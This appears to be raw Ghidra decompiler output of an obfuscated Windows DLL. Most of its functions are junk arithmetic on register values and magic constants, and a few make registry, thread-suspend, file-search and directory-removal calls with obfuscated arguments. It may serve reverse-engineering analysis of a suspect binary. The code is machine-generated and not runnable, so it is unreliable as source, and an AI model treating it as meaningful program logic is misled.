/* WARNING: Removing unreachable block (ram,0x000180053c27) */

ulonglong FUN_180053c00(void)

{
  ulonglong in_RAX;
  longlong lVar1;
  ulonglong unaff_RSI;
  undefined *puVar2;
  ulonglong unaff_R13;
  ulonglong local_28;
  
  puVar2 = &DAT_1800cdeea;
  lVar1 = FUN_180047af0();
  if (lVar1 != 0) {
    unaff_R13 = unaff_R13 << 0x1f;
    unaff_RSI = unaff_RSI ^ in_RAX;
  }
  if ((unaff_R13 & (ulonglong)&stack0xfffffffffffffff8) == 0) {
    local_28 = (local_28 | in_RAX) & unaff_RSI;
  }
  return (ulonglong)(puVar2 + local_28) >> 0x13;
}


```

---

## Function: FUN_180053cb8 (0x180053cb8)

```c

ulonglong FUN_180053cb8(void)

{
  undefined1 *puVar1;
  ulonglong uVar2;
  longlong lVar3;
  ulonglong uVar4;
  longlong unaff_RBX;
  ulonglong unaff_RSI;
  longlong lVar5;
  longlong in_R9;
  longlong lVar6;
  ulonglong in_R10;
  longlong in_R11;
  ulonglong unaff_R12;
  
  lVar6 = in_R9 + 0x12;
  lVar5 = 0;
  lVar3 = 0;
  uVar4 = 0;
  puVar1 = FUN_18001d178();
  uVar2 = (longlong)puVar1 * lVar6;
  if (lVar3 != 0) {
    in_R10 = in_R10 ^ unaff_RSI;
    unaff_RSI = unaff_RSI ^ unaff_R12;
  }
  if (-1 < (longlong)unaff_RSI) {
    uVar2 = uVar2 + unaff_RSI;
    uVar4 = uVar4 & (lVar5 - in_R11) - unaff_RBX;
  }
  if (-1 < (longlong)(in_R10 & uVar4)) {
    uVar2 = (uVar2 ^ in_R10) - 0x16;
  }
  return uVar2;
}


```

---

## Function: FUN_180053d78 (0x180053d78)

```c

ulonglong FUN_180053d78(undefined8 param_1,longlong param_2)

{
  longlong in_RAX;
  ulonglong in_R10;
  
  if ((in_R10 & param_2 + 0x1cU) == 0) {
    in_R10 = in_R10 - 0x13;
    in_RAX = in_RAX + -0x1f;
  }
  return in_RAX * 0x4000000 + 0x1eU | in_R10;
}


```

---

## Function: FUN_180053df8 (0x180053df8)

```c

/* WARNING: Removing unreachable block (ram,0x000180053e32) */

undefined1 * FUN_180053df8(void)

{
  undefined1 local_20 [16];
  
  return local_20;
}


```

---

## Function: FUN_180053f00 (0x180053f00)

```c

ulonglong FUN_180053f00(void)

{
  ulonglong uVar1;
  longlong lVar2;
  longlong lVar3;
  ulonglong unaff_RBX;
  ulonglong unaff_RSI;
  ulonglong uVar4;
  longlong in_R10;
  ulonglong uVar5;
  longlong in_R11;
  ulonglong uVar6;
  longlong lVar7;
  longlong unaff_R13;
  ulonglong uVar8;
  undefined1 local_30 [8];
  longlong local_28;
  
  uVar4 = 0;
  uVar5 = in_R10 - in_R11;
  uVar6 = in_R11 << 2;
  uVar8 = (unaff_R13 - 0x17U >> 0xf) * ((ulonglong)local_30 >> 0x2f);
  lVar3 = -0x792ce09732421b38;
  lVar2 = 0x49bb9b2bdb6b0ae1;
  uVar1 = FUN_180056370();
  if (uVar1 != 0) {
    uVar8 = uVar8 | unaff_RSI;
    uVar5 = (uVar5 + lVar2 ^ uVar6) >> 0xe;
  }
  uVar5 = uVar5 >> 4;
  lVar7 = -6;
  if ((longlong)(uVar6 - uVar8 & unaff_RBX) < 0) {
    uVar4 = uVar4 - uVar1;
    lVar7 = local_28;
  }
  if ((longlong)(uVar4 & uVar1) < 1) {
    uVar1 = uVar1 & (uVar5 + 0x1f +
                    (ulonglong)
                    (SEXT816((longlong)(lVar7 * uVar5)) != SEXT816(lVar7) * SEXT816((longlong)uVar5)
                    )) * lVar3 * 0x100 - lVar2;
  }
  return uVar1;
}


```

---

## Function: FUN_180054050 (0x180054050)

```c

undefined1 * FUN_180054050(void)

{
  undefined1 *puVar1;
  
  puVar1 = FUN_180035668();
  return puVar1 + -0xf;
}


```

---

## Function: FUN_1800540e8 (0x1800540e8)

```c

/* WARNING: Removing unreachable block (ram,0x000180054119) */

void FUN_1800540e8(void)

{
  FUN_18004f4c0();
  return;
}


```

---

## Function: FUN_180054188 (0x180054188)

```c

undefined8 FUN_180054188(void)

{
  undefined8 local_18;
  
  return local_18;
}


```

---

## Function: FUN_1800541d8 (0x1800541d8)

```c

ulonglong FUN_1800541d8(void)

{
  longlong lVar1;
  ulonglong unaff_RDI;
  ulonglong in_R11;
  ulonglong uVar2;
  
  uVar2 = in_R11 ^ unaff_RDI;
  lVar1 = FUN_18003d200();
  return lVar1 + uVar2 | unaff_RDI + 0xe;
}


```

---

## Function: FUN_180054220 (0x180054220)

```c

ulonglong FUN_180054220(void)

{
  undefined1 *puVar1;
  
  puVar1 = FUN_18003f678(&DAT_1800cb115,0,(longlong)&stack0xfffffffffffffff0);
  return (ulonglong)puVar1 >> 0x16;
}


```

---

## Function: FUN_1800542a8 (0x1800542a8)

```c

longlong FUN_1800542a8(void)

{
  ulonglong in_RAX;
  longlong lVar1;
  longlong unaff_RSI;
  ulonglong uVar2;
  ulonglong in_R10;
  ulonglong unaff_R12;
  ulonglong uVar3;
  ulonglong unaff_R13;
  
  uVar3 = unaff_R12 >> 4;
  uVar2 = unaff_RSI << 0xb;
  if (0 < (longlong)(unaff_R13 & (ulonglong)&stack0xfffffffffffffff8)) {
    uVar2 = unaff_RSI << 0xf;
    uVar3 = (uVar3 | in_RAX) >> 1 | in_R10;
  }
  lVar1 = FUN_180055c18();
  if (lVar1 == 0) {
    lVar1 = (uVar3 & uVar2) - 0xe;
  }
  return lVar1;
}


```

---

## Function: FUN_180054378 (0x180054378)

```c

undefined8 FUN_180054378(void)

{
  FUN_1800517c8();
  return 0xf76a9753;
}


```

---

## Function: FUN_1800543f0 (0x1800543f0)

```c

ulonglong FUN_1800543f0(void)

{
  undefined1 *puVar1;
  ulonglong uVar2;
  longlong unaff_RBX;
  ulonglong uVar3;
  undefined1 *puVar4;
  longlong unaff_RDI;
  longlong lVar5;
  longlong unaff_R12;
  
  puVar4 = (undefined1 *)0xffffffffffffffe8;
  lVar5 = 7;
  puVar1 = FUN_18004d010();
  puVar4 = puVar4 + (-0xd - (ulonglong)
                            (SEXT816((longlong)puVar1 * unaff_R12) !=
                            SEXT816((longlong)puVar1) * SEXT816(unaff_R12)));
  uVar3 = unaff_RBX - 0x12;
  uVar2 = (longlong)puVar1 * unaff_R12 ^ uVar3;
  if ((POPCOUNT(unaff_R12 - 3U & 200) & 1U) != 0) {
    uVar3 = uVar3 + uVar2;
    puVar4 = puVar4 + lVar5 + uVar2;
    uVar2 = uVar2 & unaff_RDI - 0x11U;
  }
  if ((POPCOUNT((ulonglong)puVar4 & 0xe8) & 1U) == 0) {
    uVar2 = uVar2 - uVar3;
  }
  return uVar2;
}


```

---

## Function: FUN_1800544a0 (0x1800544a0)

```c

void FUN_1800544a0(undefined8 param_1,longlong param_2)

{
  PHKEY unaff_R12;
  
  RegOpenKeyExW((HKEY)0xeb8172dbdcfb85a2,(LPCWSTR)(param_2 + 0x24),(DWORD)&stack0xffffffffffffffe8,
                0x800c5cf4,unaff_R12);
  FUN_1800253d8();
  FUN_18001b920();
  FUN_180003c70();
  return;
}


```

---

## Function: FUN_180054558 (0x180054558)

```c

void FUN_180054558(undefined8 param_1,undefined8 param_2,ulonglong param_3,longlong param_4)

{
  undefined1 *puVar1;
  ulonglong uVar2;
  ulonglong unaff_RBX;
  longlong unaff_RDI;
  ulonglong in_R11;
  ulonglong unaff_R12;
  longlong unaff_R13;
  
  puVar1 = &stack0xffffffffffffffd0;
  uVar2 = 0x9338685b5f631315;
  if ((longlong)(in_R11 & unaff_RBX) < 0) {
    param_3 = param_3 | unaff_RBX;
    uVar2 = unaff_R12 ^ 0x9338685b5f6312fb;
    unaff_R12 = unaff_R12 - (unaff_RBX - param_4);
    uVar2 = uVar2 & (unaff_RBX - param_4 | unaff_R13 + 9 + unaff_RDI);
  }
  NtSuspendThread(puVar1,uVar2,param_3 - unaff_R12);
  FindFirstFileA(puVar1 + 0xf,(LPWIN32_FIND_DATAA)&stack0xffffffffffffffc0);
  return;
}


```

---

## Function: FUN_180054668 (0x180054668)

```c

/* WARNING: Removing unreachable block (ram,0x0001800546ff) */
/* WARNING: Type propagation algorithm not settling */

undefined1 * FUN_180054668(void)

{
  ulonglong in_RAX;
  undefined1 *puVar1;
  longlong lVar2;
  ulonglong uVar3;
  undefined1 *puVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  undefined *puVar7;
  undefined *puVar8;
  ulonglong unaff_RBX;
  undefined1 *puVar9;
  ulonglong uVar10;
  undefined *puVar11;
  longlong in_R10;
  ulonglong uVar12;
  longlong lVar13;
  ulonglong unaff_R13;
  undefined1 *puVar14;
  undefined local_78 [16];
  undefined1 local_68 [8];
  undefined1 local_60 [8];
  undefined1 *local_58 [2];
  undefined1 local_48 [8];
  ulonglong local_40;
  undefined1 local_38 [7];
  undefined1 auStack_31 [7];
  undefined1 auStack_2a [2];
  
  uVar10 = (ulonglong)local_58 >> 4;
  uVar12 = in_R10 >> 6;
  uVar5 = 0;
  uVar6 = 0;
  puVar1 = FUN_18000db80();
  uVar3 = local_40;
  if (puVar1 != (undefined1 *)0x0) {
    uVar10 = uVar10 | unaff_RBX;
    uVar5 = uVar5 & uVar6;
    puVar1 = puVar1 + (uVar12 - 0xc);
    uVar12 = uVar12 - 0xc | unaff_R13 | in_RAX;
  }
  if (-1 < (longlong)(uVar10 & (ulonglong)puVar1)) {
    puVar1 = (undefined1 *)((ulonglong)puVar1 ^ uVar5);
  }
  lVar13 = uVar12 + 0xf +
           (ulonglong)(0xfffffffffffffffb < (ulonglong)(((ulonglong)puVar1 >> 0x16 & 1) != 0));
  puVar1 = local_68;
  FUN_180018c40();
  puVar4 = auStack_31 + 1;
  uVar5 = lVar13 + 0x19U & uVar3 >> 0x1a;
  lVar13 = -(ulonglong)
            (SEXT816((longlong)local_60 * (longlong)puVar4) !=
            SEXT816((longlong)local_60) * SEXT816((longlong)puVar4));
  puVar9 = auStack_31 + lVar13;
  puVar14 = local_48;
  if ((longlong)puVar14 < 0) {
    puVar14 = (undefined1 *)
              (((ulonglong)puVar14 & ((ulonglong)(puVar1 + -0x15) | (ulonglong)puVar4)) + uVar5);
  }
  puVar7 = &DAT_1800d2369;
  puVar11 = &DAT_1800cdf12;
  lVar2 = FUN_18001ba58();
  uVar3 = 0;
  if (lVar2 != 0) {
    puVar9 = auStack_2a + lVar13;
    uVar3 = lVar2 << 3 ^ uVar5;
    puVar7 = (undefined *)((longlong)puVar7 * 0x1000 + uVar3);
    puVar11 = puVar11 + (-9 - (longlong)puVar9);
    puVar14 = local_58[0];
  }
  puVar8 = local_78 + (longlong)puVar7;
  uVar5 = uVar3 - (longlong)puVar7 & (ulonglong)puVar9 & (ulonglong)puVar14;
  puVar1 = (undefined1 *)(uVar5 + ((longlong)((ulonglong)puVar11 >> 8) >> 5));
  if (0 < (longlong)(local_40 | (ulonglong)puVar9 & (ulonglong)puVar14)) {
    uVar5 = uVar5 ^ (ulonglong)puVar1;
    puVar1 = puVar1 + (longlong)puVar14;
    puVar8 = (undefined *)((ulonglong)puVar8 & (ulonglong)local_38);
    uVar5 = uVar5 * 0x40 - 0xf;
  }
  puVar4 = local_48;
  if ((uVar5 & (ulonglong)puVar4) != 0) {
    puVar4 = (undefined1 *)
             ((ulonglong)puVar4 |
             (ulonglong)
             (puVar1 + ((longlong)puVar8 >> 3) +
                       (ulonglong)(((longlong)puVar8 >> 2 & 1U) != 0) + 0x13));
  }
  return puVar4;
}


```

---

## Function: FUN_1800548a8 (0x1800548a8)

```c

/* WARNING: Removing unreachable block (ram,0x0001800548e5) */
/* WARNING: Removing unreachable block (ram,0x0001800549de) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1800548a8(void)

{
  FUN_180048060();
  FUN_180053868();
  FUN_180014660();
  return;
}


```

---

## Function: FUN_180054a68 (0x180054a68)

```c

/* WARNING: Removing unreachable block (ram,0x000180054b8d) */

ulonglong FUN_180054a68(void)

{
  longlong lVar1;
  ulonglong uVar2;
  undefined1 *puVar3;
  longlong unaff_RDI;
  longlong in_R9;
  ulonglong uVar4;
  ulonglong unaff_R12;
  ulonglong unaff_R13;
  longlong local_128;
  undefined1 local_80 [8];
  undefined1 local_78 [16];
  ulonglong local_68;
  undefined1 local_48 [40];
  
  uVar4 = in_R9 + 6;
  lVar1 = FUN_180043828();
  if (lVar1 == 0) {
    unaff_R13 = unaff_R13 | unaff_R12;
    uVar4 = uVar4 >> 0x15;
  }
  puVar3 = local_78;
  uVar4 = uVar4 + 0xf;
  uVar2 = FUN_180008330();
  if (uVar2 != 0) {
    unaff_RDI = unaff_RDI + ((ulonglong)puVar3 >> 0x16);
    unaff_R13 = unaff_R13 - 0x18;
    uVar4 = local_68;
  }
  if (local_128 == 0) {
    unaff_R13 = (unaff_R13 & 0x1ffffffffffff) >> 10;
  }
  uVar2 = unaff_R13 | unaff_RDI * uVar2 ^ uVar4;
  uVar4 = 0x760b4d70800;
  if (uVar2 != 0) {
    uVar4 = (uVar2 ^ (((ulonglong)local_48 >> 0x18) - 0xf) - (longlong)local_80) >> 3 ^
            0x760b4d70800;
  }
  return uVar4;
}


```

---

## Function: FUN_180054c88 (0x180054c88)

```c

longlong FUN_180054c88(undefined8 param_1,longlong param_2,undefined8 param_3,REGSAM param_4)

{
  LSTATUS LVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  longlong lVar3;
  ulonglong uVar4;
  char *_Str2;
  longlong lVar5;
  undefined1 *unaff_RDI;
  undefined1 *puVar6;
  ulonglong uVar7;
  longlong unaff_R12;
  undefined1 *puVar8;
  undefined1 auStackY_14e [110];
  undefined8 uStackY_e0;
  PHKEY in_stack_ffffffffffffff48;
  longlong local_a8;
  ulonglong local_98 [2];
  undefined1 local_88 [16];
  longlong local_78;
  ulonglong local_60;
  
  if (param_2 + 6 < 0) {
    unaff_RDI = unaff_RDI + -(param_2 + 6);
  }
  puVar8 = unaff_RDI + unaff_R12;
  uVar7 = 0;
  uVar4 = 0x98986321943ac195;
  uStackY_e0 = 0x180054cff;
  LVar1 = RegOpenKeyExW((HKEY)0x770dbb262ea693db,(LPCWSTR)0x98986321943ac195,0,param_4,
                        in_stack_ffffffffffffff48);
  uVar2 = CONCAT44(extraout_var,LVar1);
  if (uVar2 != 0) {
    puVar6 = unaff_RDI + -0x1a;
    unaff_RDI = (undefined1 *)((longlong)puVar6 * 0x20000);
    uVar4 = ((uVar4 | (ulonglong)puVar6) & (ulonglong)puVar8) >> 0x12;
  }
  if (-1 < (longlong)unaff_RDI) {
    uVar7 = uVar7 + uVar2;
    uVar2 = uVar2 | uVar7;
    uVar7 = uVar7 + uVar4;
    unaff_RDI = local_88;
  }
  _Str2 = (char *)(uVar4 + uVar2 * uVar7);
  if ((longlong)(unaff_RDI + (longlong)puVar8) < 0) {
    uVar7 = uVar7 ^ (ulonglong)unaff_RDI;
    _Str2 = _Str2 + local_a8;
  }
  uStackY_e0 = 0x180054d86;
  strcmp((char *)0x9af02b427100ac20,_Str2);
  uVar2 = 0xbf1e09e4cd16f204;
  uStackY_e0 = 0x180054d9f;
  lVar3 = FUN_180022800();
  if (lVar3 != 0) {
    uVar2 = uVar2 & uVar7;
  }
  if ((longlong)local_98 >> 0x16 == 0) {
    local_98[0] = local_98[0] - 0x10;
  }
  lVar5 = ((longlong)local_98 >> 0x16) + ((local_98[0] >> 0x1c) - local_78);
  lVar3 = (uVar2 >> 2) + 0x1c;
  uVar2 = lVar5 + 0x13;
  uStackY_e0 = 0x180054e60;
  puVar8 = FUN_18000c040();
  return (((longlong)puVar8 * 8 ^
          ((lVar3 + (longlong)puVar8 * 8) - 0x16U |
          ((longlong)auStackY_14e * 0x20000 - lVar5 | 0xc9f7f6510f65bcccU) + local_78)) >> 0x10) +
         (local_60 | uVar2) + 0x1e;
}


```

---

## Function: FUN_180054f10 (0x180054f10)

```c

/* WARNING: Removing unreachable block (ram,0x0001800550b3) */

undefined8 FUN_180054f10(void)

{
  longlong in_R9;
  undefined1 local_b0 [8];
  undefined8 local_a8;
  
  FUN_180041050(0x8cd14339fcaa52c4,in_R9 + 5,(longlong)local_b0);
  FUN_1800542a8();
  RemoveDirectoryA((LPCSTR)0x53971eb63f2e23b0);
  return local_a8;
}


```

---

## Function: FUN_1800550d8 (0x1800550d8)

```c

void FUN_1800550d8(void)

{
  FUN_18000dc58();
  return;
}


```

---

## Function: FUN_180055168 (0x180055168)

```c

ulonglong FUN_180055168(void)

{
  ulonglong uVar1;
  undefined *puVar2;
  longlong in_R10;
  undefined1 local_18 [16];
  
  puVar2 = &DAT_1800d5062;
  uVar1 = FUN_18002f050();
  if (uVar1 == 0) {
    uVar1 = (longlong)puVar2 - in_R10 | (ulonglong)local_18;
  }
  return uVar1 - 7 >> 0x1f;
}


```

---

## Function: FUN_180055228 (0x180055228)

```c

void FUN_180055228(void)

{
  return;
}


```

---

## Function: FUN_1800552a0 (0x1800552a0)

```c

void FUN_1800552a0(void)

{
  FUN_180030730(0x414e8993d30ea3e4);
  return;
}


```

---

## Function: FUN_180055350 (0x180055350)

```c

void FUN_180055350(void)

{
  RemoveDirectoryA((LPCSTR)0x78e5ad9f6d022c1f);
  return;
}


```

---

## Function: FUN_180055418 (0x180055418)

```c

longlong FUN_180055418(void)

{
  REGSAM in_R9D;
  LPCWSTR unaff_R12;
  PHKEY in_stack_ffffffffffffff78;
  undefined1 local_70 [24];
  ulonglong local_58 [7];
  
  RegOpenKeyExW((HKEY)0x26045bdc514bf6a5,unaff_R12,(DWORD)local_70,in_R9D,in_stack_ffffffffffffff78)
  ;
  return ((ulonglong)local_58 >> 9 & local_58[0]) - 2;
}


```

---

## Function: FUN_180055540 (0x180055540)

```c

ulonglong FUN_180055540(undefined8 param_1,longlong param_2)

{
  longlong in_RAX;
  ulonglong uVar1;
  longlong unaff_RBX;
  ulonglong unaff_RSI;
  ulonglong uVar2;
  ulonglong in_R11;
  
  uVar2 = (unaff_RSI & 6) * 0x40000000;
  if ((longlong)(in_R11 & unaff_RBX * in_RAX * 0x8000) < 0) {
    uVar2 = uVar2 + param_2 + 0x14;
  }
  uVar1 = FUN_18000e4b0();
  if (uVar1 == 0) {
    uVar1 = uVar2;
  }
  return uVar1 >> 0x1f;
}


```

---

